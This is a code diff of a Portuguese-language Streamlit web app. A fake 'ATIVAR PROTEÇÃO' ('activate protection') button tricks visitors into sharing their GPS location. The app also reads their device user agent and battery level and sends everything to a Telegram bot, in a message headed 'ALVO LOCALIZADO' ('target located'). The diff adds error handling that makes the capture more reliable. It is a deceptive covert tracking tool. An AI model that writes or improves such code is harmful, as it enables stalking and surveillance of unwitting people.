@@ -12,10 +12,10 @@ def enviar_telegram(mensagem):
     try: requests.post(url, json=payload)
     except: pass
 
-# 2. CONFIGURAÇÃO DA PÁGINA
+# 2. CONFIGURAÇÃO DA PÁGINA (Com cadeado e vírgula)
 st.set_page_config(page_title="SISTEMA ATIVO", page_icon="🔐", layout="centered")
 
-# 3. VISUAL (Botão Amarelo e Título)
+# 3. VISUAL (Botão Amarelo Forçado)
 st.markdown("""
     <style>
     .main { background-color: #0d1117; }
@@ -30,32 +30,29 @@ st.markdown("""
     """, unsafe_allow_html=True)
 
 # 4. CAPTURA DE DADOS (Modelo e Bateria)
-# Pegamos os dados do navegador para o relatório
 ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
 bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
 
-# 5. GPS E BOTÃO
+# 5. GPS E BOTÃO (Com trava de erro)
 loc = get_geolocation()
 
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    if loc:
+    if loc and 'coords' in loc: # Trava para evitar KeyError
         st.info("🛰️ Localização Concluída!")
         
-        # Extraindo coordenadas com segurança
         lat = loc['coords']['latitude']
         lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
-        # Montando o relatório completo igual ao original
         relatorio = (
             f"🔔 ALVO LOCALIZADO!\n\n"
-            f"📱 Aparelho: {ua[:60]}...\n"
-            f"🔋 Bateria: {bat if bat else '??'}%\n"
+            f"📱 Aparelho: {ua[:60] if ua else 'Desconhecido'}...\n"
+            f"🔋 Bateria: {bat if bat else '--'}%\n"
             f"📍 Mapa: {mapa}\n"
-            f"🌐 Coords: {lat}, {lon}"
+            f"🌐 Coordenadas: {lat}, {lon}"
         )
         
         enviar_telegram(relatorio)
-        st.success("✅ Relatório enviado com sucesso!")
+        st.success("✅ Relatório completo enviado!")
     else:
-        st.error("⚠️ Por favor, autorize o GPS e tente clicar novamente.")
+        st.warning("⚠️ Aguarde o GPS carregar ou permita o acesso na tela.")
